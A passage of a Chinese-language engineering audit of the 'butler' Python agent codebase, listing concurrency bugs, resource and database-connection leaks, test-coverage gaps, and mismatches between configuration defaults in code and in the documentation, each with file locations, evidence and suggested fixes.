**R4-5 [H] missing_lock (reference escape)** — `butler/core/read_state.py:61-66, 86-113, 149-156`  
`_bucket` 在 lock 内 `return _BY_SESSION.setdefault(...)` — 活引用逃出锁。`reset_read_state(None)` 在 lock 释放后跑 → `store` 变 detached 引用,后续 `store.setdefault` 写到"孤儿 dict"永远不被读 → **静默数据丢失**。`get_read_state` 在 lock 外迭代 → `RuntimeError: dictionary changed size during iteration`。read_state 决定"agent 是否见过此文件",torn read 改 tool dispatch 行为。  
**建议**: 所有 mutation/iteration 在同一 `with _LOCK:`;调用方需 snapshot 时 `dict(...)` 拷贝。

**R4-6 [H] file_race (TOCTOU read-merge-write)** — `butler/core/session_todos.py:164-182`  
`merge_session_todos` 流程 `load → merge → replace`,**无 per-session 锁**。两个并发 merge 同一 session_key → second write 覆盖 first 的新增 todo,用户看到"加 3 个 todo 只剩 1 个"。  
**建议**: per-`session_key` 锁(类比 `session_registry._session_locks`);或 append-only log + 周期 compact。

**R4-7 [H] async_misuse (跨 loop 共享)** — `butler/gateway/platforms/wechat_ilink.py:158, 1042, 1058, 1956`  
`_LIVE_ADAPTERS` 在 gateway event loop 写,MCP async runner loop(独立 thread+loop)读。Line 1960 `is_running_loop()` check 只防"wrong loop"协程,不改 dict 撕裂风险。Reader 看到 entry 时 adapter `_client`(aiohttp session) 可能正在被 reassign → `RuntimeError: Session is closed` 或 send 到 half-init session。  
**建议**: `threading.Lock` 守护 dict + `threading.Event` 标识 ready,reader `wait()` 短暂;或 `asyncio.run_coroutine_threadsafe` 从 gateway loop dispatch。

**R4-8 [M] missing_lock (double-checked-locking 窗口)** — `butler/gateway/session_lifecycle.py:57-78`  
`try_enter_session` 首次 `is_session_warmed(key)` 在无锁情况下 read,与 `warming_lock.acquire` 之间存在窗口;re-check (70-72) 才补。后果:同 key 两条入站消息触发两次 warming(浪费 + 重复计量)。  
**建议**: 移除首 check 或注释"乐观 fast-path"。

**R4-9 [M] resource_leak (shutdown 超时不清理)** — `butler/mcp/async_runner.py:55-108`  
```python
_loop.call_soon_threadsafe(_loop.stop)
_thread.join(timeout=timeout)
if _thread.is_alive(): return False   # 早返,无 cleanup, globals 不重置
```
Join 超时时,pending tasks 未 cancel,loop 未 close,**globals `_loop`/`_thread` 仍指向濒死 thread**。每次 gateway 重启 leak FD + memory,旧 thread 等 OS 回收。  
**建议**: 超时分支 cancel pending tasks + `loop.close()`;globals 只在 thread 真正死/硬超时后重置。

**R4-10 [M] async_misuse (sync sleep 隐式契约)** — `butler/runtime/notify.py:93`  
`push_runtime_message` 用 `time.sleep(wait)`。当前调用方都在 background sync threads 安全,但函数签名泛用,未来 refactor "让我 await 这个" 会 deadlock event loop。**无 docstring 契约/无 RuntimeError 守卫**。  
**建议**: 顶部 `if asyncio.get_running_loop() is not None: raise RuntimeError(...)`;或拆 `push_runtime_message_async`/`_sync`。

**R4-11 [M] signal_race (fallback 路径不 signal-safe)** — `butler/gateway/runner.py:223-239`  
`loop.add_signal_handler` 失败时 `signal.signal(sig, lambda *_: request_stop(stop))` — `request_stop` 调 `asyncio.Event.set()`,后者在 pure Python 调 `_get_loop()`/schedules `_waiters`,**非 async-signal-safe**。当前因 signal 跑在 main thread(=loop thread) 而 work;未来拆分 signal handler 时立即破。  
**建议**: `signal.signal` fallback 只调 `_SHUTDOWN_EVENT.set()`(C-level signal-safe),另起 `loop.call_soon_threadsafe(stop.set)` 任务监听。

**R4-12 [M] iteration_mutation (lock-free 多字段读)** — `butler/transport/stream_probe.py:13, 21-70`  
模块级 `_LAST_PROBE: dict`,whole-dict reassign 在 GIL 下原子,但 consumer 读多字段(`ok`/`provider`/`latency_ms`)无锁 — 字段可跨 record 撕裂。`provider_health.py:14` 旁已有 `_STATE_LOCK` 模式可直接复用。  
**建议**: 加 `threading.Lock`;或 `record_probe` build new dict → take lock → swap ref → release。

**R4-13 [M] missing_lock (per-process cache 跨调用读)** — `butler/gateway/platforms/wechat_ilink.py:307-359, 1948-1960`  
`ContextTokenStore._cache` 无内部锁。当前 `send_wechat_direct` 每次 new store,read 私有;但若未来 cache store per-account 就有 writer-in-lock / reader-outside-lock 的经典窗口。  
**建议**: store 内部 `threading.Lock`/`asyncio.Lock`;或文档"实例不可跨协程共享"。

**R4-14 [L] module_mutable (import-time population, no lock)** — `butler/core/message_ir.py:49-60, 230-231`  
`_CONVERTERS: dict` import 时填充,无 lock。`if key in _CONVERTERS: return` 幂等,当前无并发写触发;但未来 plugin loader / 热加载场景立即 race。  
**建议**: `_LOCK = threading.Lock()`;或 `MappingProxyType` 在 freeze 后包装。

**R4-15 [L] module_mutable (同 R4-14 模式)** — `butler/transport/providers.py:35-36` + `transport/__init__.py:28`  
`_REGISTRY` / `_ALIASES` 同样 import-time-only,无 lock 无 MappingProxy。transport 层最可能加 "运行时注册新 provider"(custom endpoint / A/B),届时 race 显形。  
**建议**: 同 R4-14。

**R4 优先级建议** (按修复 ROI):
1. **R4-1 tool_result_cache 加锁** — 影响每次 tool dispatch
2. **R4-2 task_store per-task_id 锁** — runtime 状态腐化
3. **R4-3 human_gate 全路径加锁** — gate 是 correctness gate
4. **R4-4 circuit-breaker mutation 移入锁** — 断路器自身契约
5. **R4-5 read_state 引用逃逸** — 静默数据丢失
6. **R4-9 async_runner shutdown 完整 cleanup** — 防 FD leak 累积

**R4 已排除 (subagent 复检后)**: R1-11 exp_cache(已加 `RLock`);多 core/memory/runtime 子树(全部已正确加锁);`os.fork`/`multiprocessing` 不存在;`asyncio.gather` 调用点均 `return_exceptions=True`。

### R5 — 资源管理 / 内存泄漏

**R5-1 [C] unbounded_cache** — `butler/memory/prefetch_cache.py:13, 56-62`  
`_CACHE: dict[(session_key,query)] = (q, ctx, ts)`,**无 max / LRU / TTL 驱逐**。`clear_prefetch_cache` 只在 `/new` 触发,无周期清理。WeChat gateway 长跑,每个 distinct (session,query) 加 entry,**真内存泄漏**。  
**建议**: `_CACHE_MAX = 512` + LRU;或 entry 带 TTL + `get_cached_prefetch` lazy-evict。

**R5-2 [C] db_leak (sqlite + ChromaDB)** — `butler/orchestrator.py:169-176`  
`_memory_by_tenant` LRU 64, evict `oldest` 时**未 `oldest.experience.close()` + `oldest.semantic.close()`**。每个 `ButlerMemory` 持 2 个 sqlite3.Connection(ExperienceStore + SemanticMemoryIndex)。64 上限 → 上限 leak 126 个连接 + FD + WAL。  
**建议**: evict 前 `oldest.experience.close()` / `oldest.semantic.close()`。

**R5-3 [C] db_leak (tenant switch)** — `butler/memory/facade.py:201-205`  
```python
if self._butler_global.tenant_id != tid:
    self._butler_global = ButlerMemory(settings.butler_home, tenant_id=tid)
```
多项目/多租户切换时,**旧 `ButlerMemory` 被丢弃不 close**,每次切换漏 2 个 sqlite 连接。  
**建议**: 切换前 `self._butler_global.close()`(需 `ButlerMemory` 加 `close()` 方法)。

**R5-4 [C] unbounded_cache (dead code)** — `butler/mcp/manager.py:48-49, 177`  
`_last_errors: dict[key, msg]` 每次 connect 失败写入,**从未被读,从不被清**。长跑 gateway + MCP 间歇挂 → 字典无界增长。  
**建议**: 直接删除(dead code)或改 `collections.deque(maxlen=128)`。

**R5-5 [H] subprocess_leak (pipe FD)** — `butler/tools/terminal_impl.py:151-190`  
```python
proc = subprocess.Popen(..., stdout=PIPE, stderr=PIPE)
try: ...    # TimeoutExpired 分支正确 close
# ← success path: proc.stdout/.stderr Python BufferedReader 永未 close
```
成功路径 Python-side file 句柄依赖 GC。KeyboardInterrupt / OSError 沿 watcher 传播会**直接 leak 2 个 pipe FD**。  
**建议**: success path body 包 `try/finally: _close_pipe(proc.stdout); _close_pipe(proc.stderr)`。

**R5-6 [H] unbounded_cache** — `butler/tools/tool_audit.py:15, 104-108`  
`_TOOL_AUDIT_EVENTS_BY_SESSION: dict[sk, deque(maxlen=200)]` — per-session 上限 200,**dict 自身无界**。Gateway 多 ad-hoc session(群聊轮换参会者)→ 字典累积。  
**建议**: session-cap(512) + LRU evict;`reset_tool_audit_events` 加周期清理。

**R5-7 [H] unbounded_cache** — `butler/hooks/telemetry.py:15, 33`  
同 R5-6 模式:per-session `deque(maxlen=12)`,dict 自身无界。  
**建议**: 同 R5-6。

**R5-8 [H] unbounded_cache (与 R4-5 同一文件,角度不同)** — `butler/core/read_state.py:18-19, 61-66`  
`_BY_SESSION: dict[sk, OrderedDict(max=100)]` + `_RECENT_EDITS: dict[sk, list]` — per-session capped 100,dict 自身无界。每 entry ~30 KB,长跑累积明显。  
**建议**: 顶层 session-cap 512 + FIFO evict;`reset_read_state` 加 sweep。

**R5-9 [H] retention_gap (实际 bounded, dead API)** — `butler/gateway/inbound_idempotency.py:18-20, 165-171`  
`_SEEN: dict[sk, OrderedDict(max=512)]` — `_MAX_SESSIONS=256` 强制 evict,实际**有界**;`reset_session` export 但**无 caller**。  
**建议**: wire `reset_session` 进 session-end 路径,或文档说明 dead API。

**R5-10 [H] unbounded_cache** — `butler/memory/observer_queue.py:20, 55-60`  
`_QUEUES: dict[workspace, deque(maxlen=256)]` — per-workspace capped 256, dict 自身无界。多租户 + ad-hoc project 创建累积。  
**建议**: `_MAX_WORKSPACES = 64` + FIFO evict;`clear_observer_queue` 接入 workspace 关闭路径。

**R5-11 [M] unbounded_cache (latent)** — `butler/gateway/platforms/wechat_ilink.py:362-379`  
`TypingTicketCache` TTL-on-read only,无 size cap。多用户群聊 + 罕见 user_id 累积。  
**建议**: `set()` 时若 size > 1000 触发过期 sweep,或用 OrderedDict size cap。

**R5-12 [M] unbounded_cache (perf 隐患)** — `butler/gateway/platforms/wechat_ilink.py:307-359`  
`ContextTokenStore._cache` 无上限,每次 `set()` **全文件重写**。多用户群聊下文件不断膨胀,单次 set 变 O(N)。  
**建议**: LRU cap 5000;或迁 SQLite。

**R5-13 [M] atexit_missing (signal 时不完整)** — `butler/mcp/async_runner.py:21-46`  
atexit 注册但超时 2 秒。systemd SIGTERM 是正常关闭信号,atexit 触发但 MCP stdio 子进程可能未干净终止 → 留 zombie 直到 parent reap。Loop 也未在 signal 时 close。  
**建议**: SIGTERM handler 显式 `shutdown_async_runner(timeout=5.0)` + 跟踪并 `kill` active MCP stdio children。

**R5-14 [M] unbounded_cache (latent, 与 R1-12/R4-7 同一位置)** — `butler/gateway/platforms/wechat_ilink.py:158, 1042, 1058`  
`_LIVE_ADAPTERS` 漏 disconnect 时**整 adapter 引用 + 2 aiohttp session + 2 SSL connector + 2 dedup + 2 cache** 全留。  
**建议**: `connect()` body 包 `try/except/finally`,未到 `_mark_connected()` 自动 `disconnect()`。

**R5-15 [M] fd_leak (dead code, 误导性)** — `butler/io/atomic_write.py:31-41`  
`os.fdopen` 已接管 fd,`__exit__` 总关闭。`except: os.close(fd)` 是在已关 fd 上调,EBADF 被吞 — **非真泄漏**,但 dead code 易诱导维护者"修复"时反而破坏 `with` 块。  
**建议**: 删 dead `try/except`;加注释"fdopen owns fd"。

**R5-16 [M] db_leak (ChromaDB evict 不 close)** — `butler/memory/vector_store.py:234-266`  
`_STORE_CACHE: dict[collection, VectorStore]`,`_STORE_CACHE_MAX=64`,evict `pop(oldest)` **不 close**。每个 evicted `ChromaVectorStore` 持 `chromadb.PersistentClient`(内含 sqlite conn + HNSW mmap)。多租户用 1 collection/tenant,tenant churn → 累积 leak 至 64 上限。  
**建议**: evict 前 `store._client.close()` 或 expose `VectorStore.close()`。

**R5-17 [M] atexit_missing** — `butler/memory/semantic_index.py:31-42`  
`close()` 存在但**无 atexit 注册**,ButlerMemory facade 生命周期内不调。SIGTERM 时 `_conn` 不关,WAL 可能不干净 checkpoint,下次启动 replay 延迟。  
**建议**: 模块 `atexit.register(self.close)`;或 `ButlerMemory.close()` 级联到 `semantic.close()`。

**R5-18 [L] unbounded_cache (latent, 低影响)** — `butler/core/exp_cache.py:23-24`  
`_MEM_CACHE: dict[path, ...]`,实际只有 1 path(per-tenant `llm_cache.jsonl`)→ 永远 1 entry。多 tenant 才会增长。  
**建议**: 加注释"singleton per process";或 max-size LRU 兜底。

**R5-19 [L] unbounded_cache (低风险)** — `butler/gateway/bot_loop_guard.py:18, 71-75`  
`_PAIR_COUNTS: dict[(chat_id, sender_id), deque(无 maxlen)]`,deque 由时间窗 120s 自截。Dict 实际 bounded by unique pair 数。  
**建议**: 可选 cap chat-sender pairs。

**R5 排除**: R5-20 (runtime/audit.py lock) subagent 自评"路径正确, 非问题" — 不记入。

**R5 优先级建议** (按修复 ROI):
1. **R5-1 prefetch_cache** — 唯一长跑真 OOM 风险
2. **R5-2 / R5-3 ButlerMemory close** — DB FD leak,多租户生产环境必然命中
3. **R5-4 MCP _last_errors** — dead code 删了即可
4. **R5-5 terminal_impl pipe close** — 高频 terminal 调用累积 FD
5. **R5-16 vector_store evict close** — 多租户用立即命中
6. **R5-12 ContextTokenStore 全文件重写** — perf 隐患

### R6 — 测试覆盖与质量

**R6-1 [H] missing_tests** — `butler/memory/corrective_recall.py` (90 LOC)  
`build_corrective_recall_block` / `corrective_recall_enabled` 是 `delegate_impl.py:138-145` 调用、注入 agent prompt 的关键纠错召回块;`rag_diagnostics.py:62-64` 在 `/诊断` 透传状态。**全仓库 0 个测试文件 / 0 测试函数** 直接覆盖。  
**复现**: `grep -rln "corrective_recall" tests/` 返回空(只有 `butler/` 内引用)。  
**建议**: 写 `tests/test_corrective_recall.py` — 至少覆盖:feature 开关/禁用路径/build block 时 query 长度截断/空 query 不返回 block。

**R6-2 [H] missing_tests** — `butler/tools/tool_audit.py` (285 LOC)  
模块维护 per-session `deque(maxlen=200)` 工具审计事件,被 `registry.py:18` re-export `get_tool_audit_events/reset_tool_audit_events` 给 gateway。tests 端 11+ 文件经 `butler.tools.registry` 间接调,验证 integration 但**未直接测试 `_TOOL_AUDIT_EVENTS_BY_SESSION` 上限 / FIFO / per-session 隔离 / 全局 reset 等核心不变量**。  
**复现**: `find tests/ -name "*tool_audit*"` 空(只匹配 `_audit_` 而非 `tool_audit`)。  
**建议**: 写 `tests/test_tool_audit.py` — 直接测试 module-level 状态:LIFO 截断 / per-session 互不可见 / `get_tool_audit_events` 空 session 返回 `[]` / `reset_tool_audit_events(None)` vs `(session_key)` 行为差异。

**R6-3 [H] missing_tests** — `butler/gateway/platforms/wechat_format.py` (346 LOC)  
WeChat 消息 ↔ 内部 IR 转换层,被 inbound/outbound 流水线调用,负责文本切片 / 卡片消息解析 / at-mention 抽取 / 引用处理。**全仓库 0 个测试文件 / 0 测试函数** 引用。  
**复现**: `grep -rln "wechat_format" tests/` 返回空。  
**建议**: 写 `tests/gateway/test_wechat_format.py` — 覆盖主要消息类型 (text/image/voice/card) 的正反序列化、空文本、长度上限、特殊字符转义。

**R6-4 [M] missing_tests** — CLI 子命令无直接解析测试  
`_build_parser` 注册 18 个 top-level + 4 个 sub-subcommand 命令。直接 parse_args 测试仅覆盖 `chat`/`projects`/`create`/`exec`/`gateway`/`wechat-setup`(test_main_cli.py, test_cli_acceptance.py)。**`memory` 全部 3 子命令 / `runtime` 全部 5 子命令 / `mcp` / `workflow` / `sessions` 子命令 / `preflight` / `register`** 0 直接 parser 测试;`/诊断` 等 slash 命令也只在 integration 层覆盖。  
**复现**: `grep -rE "parse_args.*memory|parse_args.*runtime|parse_args.*mcp|parse_args.*workflow|parse_args.*sessions" tests/` 返回空。  
**建议**: 每个 subcommand 加 1 个最小 parse_args smoke test(3 行/条),未来加新 subcommand 也有 fixture 模板。

**R6-5 [M] missing_tests** — 多个 core/runtime/registry 模块零测试引用  
`grep -rln "<module>" tests/` 启发式扫描发现 ≥ 26 个 source 模块无任何 test 引用(subagent 报 68,差异来自"substring vs 全名匹配"和"test 文件中 import vs assert" 的判定粒度)。代表:
- `butler/orchestrator.py`(734 行,31 方法) — `ButlerOrchestrator` 单元测试仅在 fixture 链路
- `butler/task_orchestrator.py`(791 行)
- `butler/tenant.py` / `butler/gateway_settings.py` / `butler/logging_config.py` / `butler/model_resolve.py`
- 多个 `butler/cli/*.py` provider_presets_cli / secrets_cli 等
**建议**: 列 26+ 候选清单(可用 `pycycle --no-definitions | xargs` 或自定义 `ast.NameVisitor`),按风险排:orchestrator/task_orchestrator 第一批。

**R6-6 [M] missing_tests (security-relevant)** — `butler/registry/catalog_integrity.py:73 verify_catalog_integrity`  
SHA-256 校验 catalog 完整性 → 决定 `BUTLER_CATALOG_INTEGRITY_FAIL_CLOSED=1` 时是否拒绝注册表。**无直接 test 覆盖 SHA-256 mismatch 路径**。仅有的引用是 `tests/test_five_reports_p10.py` 中 `report.catalog_integrity_ok or report.catalog_errors`(只测 report 形状)。  
**复现**: `grep -rln "verify_catalog_integrity" tests/` 返回空;`find tests/ -name "*catalog*integrity*"` 空。  
**建议**: 写测试覆盖:①空 manifest → `(True, [])` ②file missing → `errors` 含 `"missing: <rel>"` ③hash mismatch → `errors` 含 `"hash mismatch: <rel>"` ④`ensure_catalog_integrity` 在 fail-closed 模式抛/不抛。

**R6-7 [M] stale_data** — `coverage.json` 5 天前生成  
`ls -la coverage.json` → `-rw-r--r-- 1 ailearn ailearn 2157173 May 31 13:24`(即 2026-05-31),今天是 2026-06-05。中间至少经历 3 个 sprint(Sprint 23/24 + 部分 Sprint 25),新增的 `test_progressive_stream.py` / `test_sprint24_*.py` / 多个新模块均未反映。  
**影响**: 用 coverage.json 引导测试补全方向会错过新增的 0% 模块(如 R6-13 progressive_stream)。  
**建议**: CI 跑完单测自动重生成;`make coverage` / `tox -e cov` 重生命令写入 CONTRIBUTING;`pre-commit` 拒绝 `coverage.json` 1 周以上未更新。

**R6-8 [L] smoke_heavy** — 10 个 smoke / live 测试文件  
`find tests/ -name "*smoke*"` → 10 文件:test_real_api_smoke, test_cli_live_smoke, test_wechat_gateway_live_smoke, test_real_api_smoke_gates, test_memory_m3_m4_smoke 等;另 `live_llm`/`live_multimodal`/`live_vlm` 3 个 marker 占用 909 marker 总用量的 ~5%(46 处)。  
**风险**: smoke 测试是"真集成 + 高 flake 风险"双高,半数需 `BUTLER_LIVE_LLM=1` 等 env;CI 偶发失败混淆真问题。  
**建议**: `pytest -m "not (live_llm or corpus_live)"` 已是默认;在 smoke 文件首加 `# REQUIRES: <env vars>` 头部 + `pytest.mark.skipif` 自动跳过;`test_real_api_smoke_gates` 已部分实现此模式,推广到其他 smoke 文件。

**R6-10 [L] slow_tests** — 29 处 `time.sleep` 在 tests/(主断言 25)  
`grep -rn "time.sleep" tests/` → 29 命中,典型:`test_post_session_unification.py:48 time.sleep(0.3)` / `:112 time.sleep(0.15)` / `:127 time.sleep(0.5)` / `test_p0_p1_features.py:256 time.sleep(1.5)` / `test_sprint9_rel11_install_pending.py:60,196` 等等。  
**风险**: 全部累加 ≈ 2-3 秒冗余 CI 时间,且对 race condition 不可靠(`time.sleep(0.1)` 后另一线程仍未就绪是常见 flake 源)。  
**建议**: `time.sleep(0.05)` 替换为 `event.wait(timeout=0.5)` + `event.set()` 在 producer;`time.sleep(0.3)` 等"等异步 flush"改用 `await asyncio.sleep` + 显式 drain。文件级:`tests/test_post_session_unification.py` 优先重构(3 处 sleep 0.15-0.5)。

**R6-11 [C] failing_test** — `tests/test_sprint23_tst10_6_magicmock_spec_policy.py::TestBaselineGate::test_total_violations_not_growing` 失败  
**实测**: `pytest tests/test_sprint23_tst10_6_magicmock_spec_policy.py` 报:
```
AssertionError: MagicMock() 违规数从 baseline 0 增到 2 (+2). 新增的 MagicMock 调用必须加 spec= 或用 # noqa: magicmock-no-spec 豁免.
前 5 处新违规:
  tests/test_sprint24_p1_3_2_approval_diagnostics.py:156 [test_health_report_includes_approval_in_shared_lines]  orch = MagicMock()
  tests/test_sprint24_p1_3_2_approval_diagnostics.py:158 [test_health_report_includes_approval_in_shared_lines]  orch._settings = MagicMock()
```
**根因**: Sprint 23 引入"MagicMock() 强制 spec= 或 noqa 豁免"基线;Sprint 24 新增 `test_sprint24_p1_3_2_approval_diagnostics.py:156,158` 用裸 `MagicMock()`,未走豁免。  
**影响**: 基线门失败,后续 Sprint 加新测试时这条会持续阻断;若没人跑这个 test file,baseline 会持续增长但 CI 不报警(因基线 0,assert 2 <= 0 才会 fail)。  
**修复**: 加 `spec=Orchestrator` 或 `# noqa: magicmock-no-spec` 注释;建议默认 `spec=` 风格(测试里 `Orchestrator` Protocol 已存在)。

**R6-12 [L] missing_test_methodology** — 零 property-based 测试  
`grep -rE "from hypothesis|import hypothesis|@given|@example" tests/` → 0 命中。`hypothesis` 关键词在 `tests/test_outcome_reflection.py` / `test_experiment_ledger.py` / `test_roadmap_remainder.py` 出现 3 次,均为实验 ledger 的域字段名(`append_record(..., hypothesis="...")`),非 property-based testing 库。  
**建议**: 对 schema sanitizer / URL safety / permission rule matcher 这类"任意输入拒绝恶意值"模块,加 5-10 行 `@given(text())` 测试;增量价值高,改 1 个文件就够。

**R6-13 [M] coverage_zero (latent)** — `butler/gateway/progressive_stream.py` 0% 覆盖  
`coverage.json` 显示:`covered_lines: 0, num_statements: 41, percent_covered: 0.0`。  
**矛盾点**: `tests/test_progressive_stream.py` 已存在,含 8 测试覆盖 `progressive_stream_enabled` / `format_progressive_chunk` / `maybe_schedule_progressive_reply`。  
**解释**: `coverage.json` 是 2026-05-31 生成的(Sprint 23 之前),新加的 `test_progressive_stream.py` 反映不出来。`progressive_stream_enabled` 依赖 `BUTLER_PROGRESSIVE_STREAM=1` env,该 env 在 `_isolate_butler_home` autouse fixture 中未设,即便重跑 coverage 仍可能 0%。  
**建议**: (a) 跑 `pytest --cov=butler/gateway/progressive_stream --cov-report=term` 验证实际覆盖率;(b) 若真 0% 则把 `progressive_stream_enabled` 测试加 `monkeypatch.setenv("BUTLER_PROGRESSIVE_STREAM","1")`;(c) coverage.json 重生成。

**R6-14 [L] thin_edge_cases** — plan / store 错误路径测试薄  
`grep -rE "def test_.*invalid.*plan|def test_.*malformed.*plan|def test_.*corrupt.*store|def test_.*null.*store" tests/` → 0 命中。仅 `test_record_plan_and_knowledge_events` 等 happy path。  
**代表风险**: `butler/plan/store.py`(plan 持久化) / `workflow_plan_storage`(workflow 计划)的"用户编辑 plan.yaml 加非法字段" / "plan 引用不存在的 step id" / "plan 周期冲突"等 edge case,无 test 覆盖。  
**建议**: 每模块 3-5 条 edge case:`empty_plan_yaml` / `plan_with_unknown_field` / `plan_step_references_missing` / `plan_cycle_detected`。

**R6-15 [L] test_data_hygiene** — 47 处硬编码 test 数据(主断言合理)  
`grep -rE "^(127\.0\.0\.1|0\.0\.0\.0|localhost):[0-9]+|example\.com|192\.168\." tests/` → 47 命中。多数合规(`test_phase_b_external.py` 测 SSRF 拒私网、`test_contacts.py` 用 `test@example.com` 占位、`test_llm_client.py` 测 `api.example.com`)。少量需要审视:
- `tests/test_phase_b_external.py:91 perms = tmp_path / ".butler" / "permissions.yaml"` 等 hardcoded relative 路径,在非默认 cwd 下会失败  
- 多处 `time.sleep(...)` 数值硬编码  
**建议**: 加 `tmp_path` fixture 替 hardcoded `/tmp/...`(R6-16 已说明 /tmp/butler 误报);magic number 提常量。

**R6-17 [L] scattered_singleton_reset** — 多个模块各自暴露 reset 函数  
证据:
- `butler/ops/runtime_metrics.py:136 reset_session(session_key)`
- `butler/gateway/inbound_idempotency.py:165 reset_session(session_key | None)`
- `butler/gateway/message_handler.py:231 _resetting_all flag` 处理
- `butler/hooks/telemetry.py:62-64 reset_session 调用`
- `butler/memory/semantic_index.py:31 close()` 无 atexit(R5-17)
- `butler/registry/inbound_idempotency.py:209 __all__` 导出 reset
**风险**: 测试隔离 / 长跑 reload 需分别调,漏一个就跨用例污染。  
**建议**: 抽 `butler.testing.reset_all_singletons()`(Sprint 12 testing-helpers 已有部分),统一 reset hook 列表;或 `conftest.py` 加 autouse fixture 调 reset 全部 known singletons。

**R6-19 [L] unregistered_marker** — `@pytest.mark.security` 不在 pyproject.toml 标记清单  
`pyproject.toml markers = [...]` 列 13 个 marker,无 `security`。`grep -rE "@pytest\.mark\.security" tests/` → 1 命中:`tests/test_sprint12_owner_gate_scan.py:146`。  
**风险**: pytest 启动警告 `PytestUnknownMarkWarning`;`pytest --strict-markers` 会 hard-fail。  
**建议**: `pyproject.toml markers` 加 `"security: tests covering permission/SSRF/injection/Jail scenarios"`;或该测试改 `@pytest.mark.integration`(已注册)。

**R6 优先级建议** (按修复 ROI):
1. **R6-11** 修 2 行 MagicMock → baseline 不再 fail(Sprint 24 必做,1 分钟)
2. **R6-1/R6-2/R6-3** 写 3 个 100 行 test file → 关键路径覆盖率从 0 提到 60%+(各 30 分钟)
3. **R6-7** 重新跑 `pytest --cov` → coverage.json 反映最新 sprint
4. **R6-6** 写 `tests/test_catalog_integrity.py` → SHA-256 fail-closed 路径有回归保护(20 分钟)
5. **R6-4** 14 个 subcommand 各 1 个 parse_args test(2-3 小时,但模板化后 5 分钟/条)
6. **R6-13** 验证 progressive_stream 真覆盖 + 加 env fixture(15 分钟)
7. **R6-10** 把 `time.sleep` 替换为 `event.wait`(渐进,1-2 小时)

### R7 — 文档漂移

**R7-1 [C] config_drift (三处默认自相矛盾 + 代码双默认)** — `BUTLER_ONBOARDING_WELCOME`  
**证据**:
- `butler/config_service.py:101` `_register("BUTLER_ONBOARDING_WELCOME", ..., "0")` ← 元数据默认 0
- `butler/gateway/handler_helpers.py:334` `os.getenv("BUTLER_ONBOARDING_WELCOME", "1")` ← 运行时默认 1
- `docs/config/reference.md:435` 默认 `0` / `docs/config/reference.md:483` 默认 `1` / `CONTRIBUTING.md:62` 默认 `1` / `.env.example:506` "默认启用"
**现象**: 同一 env 在 4 处文档 + 2 处代码给出 2 种默认(0/1)。`/onboarding` 是否触发首次欢迎语**完全取决于运行时读哪段代码**,而两段代码答案相反。  
**建议**: 选 `1` 为唯一默认(运行时已确认),统一为 `config_service.py:101` 改 `"1"`,删除 `reference.md:435` 的 `0` 行,`reference.md:483` 保留作为权威表。

**R7-2 [H] config_drift (5 个 env 默认集体错位)** — 上下文压缩 5 个 env  
**证据**:
| env | 文档默认 | 代码常量 / `_int_env` 第二个参数 | 实际默认 |
|---|---|---|---|
| `BUTLER_CONTEXT_OUTPUT_RESERVE` | 16384 | `_MAX_OUTPUT_TOKENS_FOR_SUMMARY` | **20000** |
| `BUTLER_CONTEXT_COMPACT_RESERVE` | 32768 | `_AUTOCOMPACT_BUFFER_TOKENS` | **13000** |
| `BUTLER_CONTEXT_WARNING_BUFFER` | 4096 | `_WARNING_THRESHOLD_BUFFER_TOKENS` | **20000** |
| `BUTLER_CONTEXT_ERROR_BUFFER` | 2048 | `_ERROR_THRESHOLD_BUFFER_TOKENS` | **20000** |
| `BUTLER_CONTEXT_BLOCKING_BUFFER` | 1024 | `_MANUAL_COMPACT_BUFFER_TOKENS` | **3000** |
  
来源: `docs/config/reference.md:206-210` vs `butler/core/context_budget.py:13-17, 95, 120, 137-139`  
**根因**: `context_budget.py` 注释 `# Claude Code v2.1.88 defaults (services/compact/autoCompact.ts)`,代码是按 CC v2.1.88 改写默认,文档仍抄老 16k/32k。  
**建议**: 整段重写到代码实际值,或加注释"Butler 自改默认,见 `context_budget.py` 注释"。

**R7-3 [H] config_drift** — `BUTLER_PROVIDER_CIRCUIT_OPEN_SECONDS`  
**证据**: `docs/config/reference.md:300` 默认 `60`;`butler/transport/provider_health.py:38` `float(os.getenv(..., "120"))` 默认 **120**。  
**建议**: 改文档为 `120`,或加注释"自 Sprint X 起从 60 调到 120"。

**R7-4 [H] config_drift** — 2 个 `BUTLER_TURN_BUDGET_*`  
**证据**:
- `BUTLER_TURN_BUDGET_MAX_ITERATIONS` 文档 `50` / 代码 `turn_token_budget.py:72` 默认 `60`
- `BUTLER_TURN_BUDGET_DEFAULT` 文档 `200000` / 代码 `turn_token_budget.py:88` 默认 `500000`
**建议**: 同步为代码实际值(50→60, 200000→500000)。

**R7-5 [H] config_drift** — 4 个 `BUTLER_TOOL_PRUNE_*`  
**证据**:
| env | 文档 | 代码 (`tool_prune_policy.py:46-54`) |
|---|---|---|
| `BUTLER_TOOL_PRUNE_KEEP_RECENT` | 3 | **4** |
| `BUTLER_TOOL_PRUNE_CLEARABLE_CHARS` | 100 | **400** |
| `BUTLER_TOOL_PRUNE_PRESERVE_CHARS` | 2000 | **2400** |
| `BUTLER_TOOL_PRUNE_DEFAULT_CHARS` | 600 | **800** |
  
**建议**: 整段重写,文档反映 `tool_prune_policy.py` 内 `_int_env` 第二参数。

**R7-6 [H] config_drift** — 2 个 `BUTLER_INSTRUCTION_WALKUP_MAX_*`  
**证据**:
- `BUTLER_INSTRUCTION_WALKUP_MAX_CHARS` 文档 `2000` / 代码 `_MAX_BLOCK_CHARS = 4000`(`instruction_walkup.py:17-18`)
- `BUTLER_INSTRUCTION_WALKUP_MAX_FILES` 文档 `8` / 代码 `_MAX_FILES_PER_TURN = 3`(`instruction_walkup.py:85`)
**建议**: 同步为代码实际值;并把硬编码常量改为可被 env 覆盖(`@functools.lru_cache` 包装 `_int_env` 调用)。

**R7-7 [H] config_drift** — `BUTLER_GATEWAY_COMPLETION_NOTIFY_MIN_SECONDS`  
**证据**:
- `docs/config/reference.md:45` 默认 `10`(与 progress ack 间隔冲突,逻辑上不可能 10s)
- `CONTRIBUTING.md:131` 默认 `90`
- `butler/gateway/completion_notify.py:35` `_env_float(..., 90.0)` 默认 **90**
**建议**: 改 `reference.md:45` 为 `90`,并加一句"≥ `BUTLER_PROGRESS_ACK_INTERVAL_SECONDS`(避免 progress ack 完成后立刻又推 final)"。

**R7-8 [H] config_drift (字段名/单位混乱)** — `BUTLER_GATEWAY_DELEGATE_COMPLETION_MAX_EACH`  
**证据**:
- 文档 `reference.md:46` 默认 `500`,**单位:字符**
- 代码 `completion_notify.py:61` `max(1, int(os.getenv(..., "3")))` 默认 **3 次**
